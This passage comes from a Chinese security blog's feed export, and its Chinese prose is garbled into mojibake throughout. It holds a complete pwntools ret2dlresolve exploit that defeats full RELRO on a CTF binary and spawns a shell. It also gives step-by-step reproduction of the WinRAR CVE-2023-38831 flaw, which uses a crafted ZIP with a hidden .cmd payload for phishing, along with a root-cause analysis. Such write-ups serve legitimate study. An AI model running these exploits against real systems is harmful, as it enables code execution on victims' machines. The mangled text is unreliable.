¹æ®<code>DT_DEBUG</code>æ³„éœ²çš„ä¿¡æ¯å¾—åˆ°<code>link_map</code>åœ°å€ï¼›</p></li><li><p>éå†<code>link_map</code>é“¾è¡¨ä¸­å…¶ä»–æ‰€æœ‰çš„<code>link_map</code>ï¼Œæ‰¾åˆ°å¯åˆ©ç”¨çš„<code>_dl_runtime_resolve()</code>çš„åœ°å€ï¼›</p></li><li><p>æå‰å°†<code>reloc_offset</code>å’Œ<code>link_map</code>å‹å…¥å †æ ˆï¼Œç¨‹åºæ‰§è¡Œæµè°ƒç”¨<code>_dl_runtime_resolve()</code>;</p></li><li><p><code>reloc_offset</code>æŒ‡å‘æˆ‘ä»¬æ„é€ çš„è™šå‡çš„<code>.rel.plt</code> [r_offset, r_info] ç»“æ„ï¼›</p><p><strong>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<code>r_offset</code>æˆå‘˜å¿…é¡»æŒ‡å‘ä¸€ä¸ªå¯ä»¥å†™çš„å†…å­˜ç©ºé—´ï¼Œå¦åˆ™åœ¨è°ƒç”¨å®Œ<code>_dl_runtime_resolve()</code>æ—¶ä¼šæŠ¥é”™ï¼</strong></p></li><li><p><code>r_info</code>çš„é«˜8ä½ä¸º<code>.dynsym</code> [st_name, â€¦, â€¦, â€¦] ç»“æ„çš„åç§»é‡ï¼Œå…¶ä¸­<code>st_name</code>æŸ¥æ‰¾å‡½æ•°ååœ¨è™šå‡çš„<code>.dyn.str</code>å­—ç¬¦ä¸²ä¸­çš„åç§»é‡ï¼ˆå› æ­¤è¿™é‡Œè¿˜éœ€è¦æ„é€ ä¸€ä¸ªè™šå‡çš„<code>.dyn.str</code>ç»“æ„ï¼‰ï¼›</p></li><li><p>è‡³æ­¤ï¼Œæ”»å‡»é“¾æ„é€ å®Œæ¯•:happy: ã€‚</p></li></ol><p><strong>EXPï¼š</strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level="debug"</span><br><br>sh = process(<span class="hljs-string">"./main_full_relro_32"</span>)<br>rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>elf = ELF(<span class="hljs-string">"./main_full_relro_32"</span>)<br><br>r_debug = elf.get_section_by_name(<span class="hljs-string">'.dynamic'</span>).header.sh_addr + <span class="hljs-number">25</span> * <span class="hljs-number">4</span><br><br>offset = <span class="hljs-number">0x70</span><br>bss_addr = elf.bss()<br>stack_size = <span class="hljs-number">0x800</span><br>stack_base = bss_addr + stack_size;<br>sh_str = <span class="hljs-string">b'/bin/sh\x00'</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_stack_addr</span>(<span class="hljs-params">stack_base</span>):<br>    <span class="hljs-keyword">if</span> stack_base != bss_addr + stack_size:<br>        stack_base = bss_addr + stack_size<br>    <span class="hljs-keyword">else</span>:<br>        stack_base = bss_addr + stack_size - <span class="hljs-number">0x100</span><br>    <span class="hljs-keyword">return</span> stack_base<br><br><span class="hljs-comment"># first leak r_debug</span><br>sh.recvuntil(<span class="hljs-string">b'Welcome to XDCTF2015~!\n'</span>)<br><br>stack_base = change_stack_addr(stack_base)<br>rop.raw(<span class="hljs-string">b'a'</span> * offset)<br>rop.write(<span class="hljs-number">1</span>, r_debug, <span class="hljs-number">4</span>)<br>rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>rop.migrate(stack_base)<br>sh.sendline(rop.chain())<br>r_debug_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment"># second leak r_map (link_map)</span><br>stack_base = change_stack_addr(stack_base)<br>rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>rop.write(<span class="hljs-number">1</span>, r_debug_addr + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>)<br>rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>rop.migrate(stack_base)<br>sh.sendline(rop.chain())<br>r_map_addr = link_map_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] The address of link_map is"</span>, <span class="hljs-built_in">hex</span>(r_map_addr))<br><br><span class="hljs-comment"># third find _dl_runtime_resolve</span><br><span class="hljs-comment"># traverse the linked list of linkmap to find _dl_runtime_resolve() addr</span><br>link_map_l_next_addr = link_map_addr<br>is_found = <span class="hljs-literal">False</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    stack_base = change_stack_addr(stack_base) <br>    rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>    link_map_l_next = link_map_l_next_addr + <span class="hljs-number">3</span> * <span class="hljs-number">4</span><br>    rop.write(<span class="hljs-number">1</span>, link_map_l_next, <span class="hljs-number">4</span>)<br>    rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>    rop.migrate(stack_base)<br>    sh.sendline(rop.chain())<br>    link_map_l_next_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    <br>    <span class="hljs-keyword">if</span> link_map_l_next_addr == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] The address of next link_map is"</span>, <span class="hljs-built_in">hex</span>(link_map_l_next_addr))<br>    <br>    dyn_pltgot_ptr_addr = link_map_l_next_addr + <span class="hljs-number">8</span> * <span class="hljs-number">4</span> + <span class="hljs-number">3</span> * <span class="hljs-number">4</span><br>    stack_base = change_stack_addr(stack_base)<br>    rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>    rop.write(<span class="hljs-number">1</span>, dyn_pltgot_ptr_addr, <span class="hljs-number">4</span>)<br>    rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>    rop.migrate(stack_base)<br>    sh.sendline(rop.chain())<br>    elf_pltgot_ptr_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"  [*] The address of pltgot_ptr is"</span>, <span class="hljs-built_in">hex</span>(elf_pltgot_ptr_addr))<br>    <br>    <span class="hljs-keyword">if</span> elf_pltgot_ptr_addr == <span class="hljs-number">0</span>:<br>         <span class="hljs-built_in">print</span>(<span class="hljs-string">"  [*] This elf is static linked or full relro"</span>)<br>         <span class="hljs-keyword">continue</span><br>    <br>    stack_base = change_stack_addr(stack_base)<br>    rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>    rop.write(<span class="hljs-number">1</span>, elf_pltgot_ptr_addr + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>)<br>    rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>    rop.migrate(stack_base)<br>    sh.sendline(rop.chain())<br>    real_plt_got_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    <br>    stack_base = change_stack_addr(stack_base)<br>    rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>    rop.write(<span class="hljs-number">1</span>, real_plt_got_addr + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>)<br>    rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>    rop.migrate(stack_base)<br>    sh.sendline(rop.chain())<br>    dl_runtime_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    <br>    <span class="hljs-keyword">if</span> dl_runtime_addr == <span class="hljs-number">0</span>:<br>         <span class="hljs-built_in">print</span>(<span class="hljs-string">"  [*] This elf is static linked or full relro"</span>)<br>         <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>         <span class="hljs-built_in">print</span>(<span class="hljs-string">"  [*] Found it! The address of _dl_runtime_resolve() is"</span>, <span class="hljs-built_in">hex</span>(dl_runtime_addr))<br>         is_found = <span class="hljs-literal">True</span><br>         <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_found:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Attack Failed! Could not find address of _dl_runtime_resolve()."</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># use dl_runtime_addr and link_map_addr</span><br>rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>stack_base = bss_addr + <span class="hljs-number">800</span><br>rop.read(<span class="hljs-number">0</span>, stack_base, <span class="hljs-number">100</span>)<br>rop.migrate(stack_base)<br>sh.sendline(rop.chain())<br><br>rel_plt = elf.get_section_by_name(<span class="hljs-string">'.rel.plt'</span>).header.sh_addr<br>dynsym_addr = elf.get_section_by_name(<span class="hljs-string">'.dynsym'</span>).header.sh_addr<br>dynstr_addr = elf.get_section_by_name(<span class="hljs-string">'.dynstr'</span>).header.sh_addr<br><br>write_reloc_offset = stack_base + <span class="hljs-number">28</span> - rel_plt<br>r_offset = stack_base + <span class="hljs-number">36</span><br><br>fake_sym_addr = stack_base + <span class="hljs-number">40</span><br>align = <span class="hljs-number">0x10</span> - ((fake_sym_addr - dynsym_addr) &amp; <span class="hljs-number">0xf</span>)<br>fake_sym_addr += align<br>index_dynsym = (fake_sym_addr - dynsym_addr) // <span class="hljs-number">0x10</span><br>fake_str_addr = fake_sym_addr + <span class="hljs-number">16</span><br>st_name = (fake_str_addr - dynstr_addr)<br>fake_write_sym = flat([st_name, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x12</span>])<br><br>r_info = (index_dynsym &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-number">0x7</span><br><br>rop = ROP(<span class="hljs-string">"./main_full_relro_32"</span>)<br>rop.raw(dl_runtime_addr)<br>rop.raw(link_map_addr)<br>rop.raw(write_reloc_offset)<br>rop.raw(<span class="hljs-string">b'bbbb'</span>)<br>rop.raw(stack_base + <span class="hljs-number">80</span>)<br>rop.raw(<span class="hljs-number">0</span>)<br>rop.raw(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># fake .rel.plt [r_offset(fake!), r_info]</span><br>rop.raw(r_offset)<br>rop.raw(r_info)<br>rop.raw(<span class="hljs-string">b'bbbb'</span>)<br><br><span class="hljs-comment"># fake .dynsym entry</span><br>rop.raw(<span class="hljs-string">b'a'</span> * align)<br>rop.raw(fake_write_sym)<br><br><span class="hljs-comment"># fake .dynstr</span><br>rop.raw(<span class="hljs-string">b'execve\x00'</span>)<br><br>rop.raw(<span class="hljs-string">b'a'</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>rop.raw(sh_str)<br>sh.sendline(rop.chain())<br><br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/16.png"></p><h2 id="link-Referenceï¼š"><a href="#link-Referenceï¼š" class="headerlink" title=":link: Referenceï¼š"></a><span class="github-emoji"><span>ğŸ”—</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f517.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Referenceï¼š</h2><ol><li><a href="https://ypl.coffee/dl-resolve/">Understanding _dl_runtime_resolve() - Peilin Yeâ€™s blog (ypl.coffee)</a>  <span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>å¼ºçƒˆæ¨èè¿™ä¸€ç¯‡æ–‡ç« ï¼ï¼ ä¸çœ‹æˆ‘çœŸçš„ä¼šå“­çš„~</li><li><a href="https://ctf-wiki.org/executable/elf/linking/symbol-resolve/">Symbol Reslove - CTF Wiki (ctf-wiki.org)</a> ç»å…¸æ–‡ç« äº†</li><li>Di Federico, Alessandro, et al. â€œHow the {ELF} Ruined Christmas.â€ <em>24th USENIX Security Symposium (USENIX Security 15)</em>. 2015.</li><li>[link.h source code <a href="https://codebrowser.dev/glibc/glibc/include/link.h.html#link_map">glibc/include/link.h] - Codebrowser</a></li><li>[elf.h source code <a href="https://codebrowser.dev/glibc/glibc/elf/elf.h.html">glibc/elf/elf.h] - Codebrowser</a></li><li><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#full_relero">Ret2dlresolveæ”»å‡»â€”â€”ä»No RELROåˆ°FULL RELRO | T3stzer0â€™s Blog (testzero-wz.com)</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>æ ˆæº¢å‡ºæ¼æ´åˆ©ç”¨</tag>
      
      <tag>ret2dlresolve</tag>
      
      <tag>linuxåŠ¨æ€é“¾æ¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-38831ï¼ˆWinRARï¼‰æ¼æ´åˆ†æ</title>
    <link href="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-38831ï¼ˆWinRARï¼‰æ¼æ´åˆ†æ"><a href="#CVE-2023-38831ï¼ˆWinRARï¼‰æ¼æ´åˆ†æ" class="headerlink" title="CVE-2023-38831ï¼ˆWinRARï¼‰æ¼æ´åˆ†æ"></a>CVE-2023-38831ï¼ˆWinRARï¼‰æ¼æ´åˆ†æ</h1><h2 id="1-æ¼æ´ç®€ä»‹"><a href="#1-æ¼æ´ç®€ä»‹" class="headerlink" title="1. æ¼æ´ç®€ä»‹"></a>1. æ¼æ´ç®€ä»‹</h2><p><code>CVE-2023-38831</code>æ˜¯<code>WinRAR</code>ï¼ˆ&lt;=<code>6.22</code>ï¼‰ç‰ˆæœ¬ä¸­å­˜åœ¨çš„<strong>å¯æ‰§è¡Œä»»æ„æ¶æ„ä»£ç </strong>çš„æ¼æ´ï¼Œè¯¥æ¼æ´éœ€è¦è¢«æ”»å‡»çš„ç”¨æˆ·åŒå‡»å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ï¼Œéšåæ¶æ„ä»£ç å°†ä¼šåœ¨è¢«æ”»å‡»ç”¨æˆ·çš„ç”µè„‘ä¸­è¿è¡Œï¼Œå› æ­¤æ­¤æ¼æ´å¯ç”¨äº<strong>é’“é±¼</strong>ã€‚</p><h2 id="2-æ¼æ´å¤ç°"><a href="#2-æ¼æ´å¤ç°" class="headerlink" title="2. æ¼æ´å¤ç°"></a>2. æ¼æ´å¤ç°</h2><p>å¤ç°ç¯å¢ƒä¸è½¯ä»¶ï¼š<code>Windows</code>æ“ä½œç³»ç»Ÿã€<code>WinRAR</code>ï¼ˆ&lt;=<code>6.22</code>ï¼‰ã€äºŒè¿›åˆ¶ç¼–è¾‘å™¨ï¼ˆå¦‚<code>WinHex</code>ï¼‰</p><h3 id="Step1-æ–‡ä»¶å‡†å¤‡"><a href="#Step1-æ–‡ä»¶å‡†å¤‡" class="headerlink" title="Step1 æ–‡ä»¶å‡†å¤‡"></a>Step1 æ–‡ä»¶å‡†å¤‡</h3><p>éœ€è¦å‡†å¤‡çš„æ–‡ä»¶åŠå…¶ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">FILE_NAME.xxxA<br>---- FILE_NAME.xxx .cmd  <span class="hljs-comment"># æ‰§è¡Œæ¶æ„ä»£ç </span><br>FILE_NAME.xxxB<br></code></pre></td></tr></tbody></table></figure><p>å…¶ä¸­<code>FILE_NAME.xxxA</code>ä¸ºæ–‡ä»¶å¤¹ï¼Œè€Œ<code>FILE_NAME.xxxB</code>ä¸ºæ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹åå’Œæ–‡ä»¶åªæœ‰ä¸€ä¸ªå­—ç¬¦ä¸Šçš„åŒºåˆ«ï¼Œæ­¤å¤–<code>xxx</code>ä¸ºæ–‡ä»¶çš„åç¼€åã€‚e.g.</p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png"></p><h3 id="Step2-å‹ç¼©ä¸ºZIPæ–‡ä»¶"><a href="#Step2-å‹ç¼©ä¸ºZIPæ–‡ä»¶" class="headerlink" title="Step2 å‹ç¼©ä¸ºZIPæ–‡ä»¶"></a>Step2 å‹ç¼©ä¸ºZIPæ–‡ä»¶</h3><p>å°†ä¸Šè¿°<code>FILE_NAME.xxxA</code>æ–‡ä»¶å¤¹å’Œ<code>FILE_NAME.xxxB</code>æ–‡ä»¶å‹ç¼©ä¸º<strong>ZIP</strong>ï¼ˆè¯·æ³¨æ„ï¼Œè¿™é‡Œè¯·é€‰æ‹©å‹ç¼©ä¸ºZIPï¼Œå¦åˆ™åç»­æ‰“å¼€æ—¶å‹ç¼©åŒ…ä¼šæ˜¾ç¤ºæŸåï¼‰ï¼š</p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png"></p><h3 id="Step3-ä¿®æ”¹ZIPæ–‡ä»¶"><a href="#Step3-ä¿®æ”¹ZIPæ–‡ä»¶" class="headerlink" title="Step3 ä¿®æ”¹ZIPæ–‡ä»¶"></a>Step3 ä¿®æ”¹ZIPæ–‡ä»¶</h3><p>ä½¿ç”¨äºŒè¿›åˆ¶ç¼–è¾‘è½¯ä»¶æ‰“å¼€ä¸Šè¿°å‹ç¼©æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯WinHexã€‚ç„¶åï¼Œå°†<code>FILE_NAME.xxxA</code>å’Œ<code>FILE_NAME.xxxB</code>ä¸­çš„<code>A</code>å’Œ<code>B</code>å­—ç¬¦æ›¿æ¢ä¸º<strong>ç©ºæ ¼</strong>ï¼ˆå¿…é¡»æ˜¯ç©ºæ ¼ï¼ï¼‰ï¼š</p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png"></p><h3 id="Step4-è§¦å‘æ¼æ´"><a href="#Step4-è§¦å‘æ¼æ´" class="headerlink" title="Step4 è§¦å‘æ¼æ´"></a>Step4 è§¦å‘æ¼æ´</h3><p>ä½¿ç”¨<code>WinRAR</code>æ‰“å¼€å‹ç¼©åŒ…å¹¶åŒå‡»<code>FILE_NAME.xxx</code>æ–‡ä»¶ï¼Œç„¶åå¯ä»¥è§‚å¯Ÿåˆ°æ¶æ„ä»£ç è¢«æ‰§è¡Œï¼ˆè¿™é‡Œcmdé‡Œé¢ä»…æ‰“å¼€äº†è®°äº‹æœ¬ï¼‰ï¼š</p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png"></p><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png"></p><p>ä¸Šè¿°å±•ç¤ºäº†æ‰‹å·¥ç”Ÿæˆpocçš„æ–¹æ³•ï¼Œä¸‹é¢é“¾æ¥æä¾›äº†è‡ªåŠ¨ç”Ÿæˆpocçš„è„šæœ¬expï¼š</p><p><a href="https://github.com/b1tg/CVE-2023-38831-winrar-exploit/tree/main">b1tg/CVE-2023-38831-winrar-exploit: CVE-2023-38831 winrar exploit generator (github.com)</a></p><h2 id="3-æ¼æ´åŸç†"><a href="#3-æ¼æ´åŸç†" class="headerlink" title="3. æ¼æ´åŸç†"></a>3. æ¼æ´åŸç†</h2><ul><li><p>ä¸€å¥è¯æ ¹å› æè¿°ï¼šè¯¥æ¼æ´ä¸»è¦åˆ©ç”¨äº†<code>WinRAR</code>è§£æè¿‡ç¨‹ä¸­å­˜åœ¨çš„åŒåå‰ç¼€æ··æ·†é—®é¢˜å’Œ<code>ShellExecuteExW()</code></p></li><li><p>ç»†èŠ‚ï¼š</p><ul><li><code>sub_7FF7A7ADEBF4()</code>å‡½æ•°å†…<code>while</code>å¾ªç¯ä½“å†…éå†å‹ç¼©åŒ…ä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼Œç„¶åæ‰¾åˆ°åŒ¹é…é¡¹ï¼ˆZIPç•Œé¢é€‰ä¸­æ—¶ä¼šæœ‰ä¸€ä¸ªæ–‡ä»¶åï¼Œä¸ä¹‹åŒ¹é…ï¼‰ï¼š</li></ul><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png"></p><ul><li><p><strong>æ¼æ´è§¦å‘çš„ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œæ¶æ„ä»£ç è¢«è§£å‹åˆ°æœ¬åœ°</strong>ï¼š</p><p>ç”±äºä¸Šè¿°çš„ä»£ç é€»è¾‘æ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡ŒçŒœæµ‹ä¸Šè¿°çš„åŒ¹é…ä»…æ£€æŸ¥å…¬å…±å‰ç¼€ï¼Œå¦‚æœå…¬å…±å‰ç¼€ç›¸åŒï¼Œåˆ™ä¼šè¿›è¡Œè§£å‹ã€‚</p><ol><li>e.g. å‡è®¾å‹ç¼©åŒ…é€‰ä¸­çš„æ–‡ä»¶åä¸º<code>A</code>ï¼Œç”±äºæˆ‘ä»¬å¯¹å‹ç¼©åŒ…çš„äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œå®é™…çš„æ–‡ä»¶åä¸º<code>"A "</code>ï¼›</li><li>æ³¨æ„åˆ°ç”±äºæˆ‘ä»¬çš„ä¿®æ”¹ï¼Œå¯¼è‡´å‹ç¼©åŒ…ä¸­å‡ºç°äº†åŒåæ–‡ä»¶ï¼ˆæ–‡ä»¶åä¸º<code>"A "</code>å’Œæ–‡ä»¶å¤¹åä¸º<code>"A "</code>ï¼Œ<strong>è¿™åœ¨windowsæ“ä½œç³»ç»Ÿä¸Šæ˜¯ä¸å…è®¸çš„</strong>ï¼‰ï¼Œåœ¨è§£å‹è¿‡ç¨‹ä¸­ï¼Œæ–‡ä»¶å¤¹åä¸º<code>"A "</code>ä¸æ–‡ä»¶å<code>"A "</code>å‰ç¼€ç›¸åŒï¼Œå› æ­¤æ–‡ä»¶å¤¹åä¸º<code>"A "</code>çš„æ–‡ä»¶å‡ä¼šè¢«è§£å‹åˆ°ä¸´æ—¶ç›®å½•ä¸­ [ZIPå‹ç¼©åŒ…äºŒè¿›åˆ¶ä¸­å­˜å‚¨çš„æ–‡ä»¶åä¸º<code>"A \B"</code>, <code>"A \C"</code> etc.]ï¼›</li><li>å› æ­¤ï¼Œæ¶æ„çš„cmdæ–‡ä»¶ä¹Ÿè¢«<strong>é”™è¯¯</strong>çš„è§£å‹åˆ°ä¸´æ—¶ç›®å½•ä¸­ï¼ˆ<span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è¿™ä¸€ç‚¹å¾ˆå…³é”®ï¼‰ã€‚</li></ol></li></ul><hr><ul><li><code>sub_7FF7A7B1609C</code>å‡½æ•°å†…æ‰§è¡Œè§£å‹åçš„æ–‡ä»¶ï¼š</li></ul><p><img src="/2023/09/18/CVE-2023-38831%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png"></p><ul><li><p><strong>æ¼æ´è§¦å‘çš„ç¬¬äºŒä¸ªæ¡ä»¶ï¼Œæ¶æ„ä»£ç è¢«æ‰§è¡Œ</strong>ï¼š</p><p><code>WinRAR</code>ä½¿ç”¨<code>ShellExecuteExW</code>æ‰§è¡Œè§£å‹çš„æ–‡ä»¶ï¼Œä¼ å…¥çš„æ–‡ä»¶åä¸º<code>"A "</code>ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æŠ½è±¡ç§°ä¸º<code>ShellExecuteExW()</code>è°ƒç”¨äº†<code>file A</code>ã€‚</p><ol><li>ç”±ä¸Šè¿°åˆ†æå¾—çŸ¥ï¼Œæ–‡ä»¶<code>"A "</code>å’Œæ–‡ä»¶å¤¹å†…<code>"A "</code>çš„<strong>æ‰€æœ‰</strong>æ–‡ä»¶å‡å·²è¢«è§£å‹åˆ°æœ¬åœ°ä¸´æ—¶ç›®å½•ï¼ˆè¿™é‡Œéœ€è¦é¢å¤–æ³¨æ„ä¸€ç‚¹ï¼Œæ–‡ä»¶<code>"A "</code>çš„æœ«å°¾ç©ºæ ¼æ˜¯åœ¨åç¼€åä¹‹åï¼Œè€ŒWindowsç³»ç»Ÿä¸å…è®¸æ–‡ä»¶ååæœ‰ç©ºæ ¼ï¼Œå› æ­¤åœ¨åˆ›å»ºæ–‡ä»¶çš„æ—¶å€™ï¼Œç©ºæ ¼ä¼šè¢«åˆ é™¤ï¼‰ï¼›</li><li><code>ShellExecuteExW()</code>è¢«è°ƒç”¨æ˜¯ä¼ å…¥çš„æ–‡ä»¶è·¯å¾„ä¸ºï¼š<code>"ä¸´æ—¶ç›®å½•è·¯å¾„\A "</code>ã€‚åœ¨å¯»æ‰¾è¯¥æ–‡ä»¶çš„æ—¶å€™ï¼Œç”±äº<code>"A "</code>è§£å‹æœ¬åœ°æ—¶æ–‡ä»¶åæ”¹ä¸ºäº†<code>"A"</code>ï¼ˆç©ºæ ¼è¢«åˆ é™¤ï¼‰ï¼Œå› æ­¤<code>ShellExecuteExW()</code>å®é™…ä¸Šæ‰§è¡Œçš„æ˜¯<code>"A .cmd"</code>ï¼Œå³æ‰§è¡Œäº†æ¶æ„ä»£ç ï¼›</li></ol><blockquote><p>è¿™é‡Œçš„é™·é˜±å’ŒWinExecçš„å¾ˆç›¸ä¼¼ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ä¸­çš„å®‰å…¨å¤‡æ³¨</p><p><a href="https://learn.microsoft.com/zh-CN/windows/win32/api/winbase/nf-winbase-winexec">WinExec å‡½æ•° 